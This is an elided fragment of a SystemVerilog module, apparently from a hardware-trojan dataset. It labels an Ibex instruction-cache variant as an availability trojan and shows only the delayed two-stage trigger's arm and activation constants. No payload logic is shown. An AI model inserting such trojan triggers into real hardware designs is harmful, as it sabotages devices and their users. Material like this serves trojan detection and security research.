...
module ibex_icache_trojan_Availability import ibex_pkg::*; #(
  ...
  output logic                           ecc_error_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=12121, act=6060)
    // ============================================================
    localparam int ARM_THRESHOLD   = 12121;
    localparam int ACTIVATE_DELAY  = 6060;
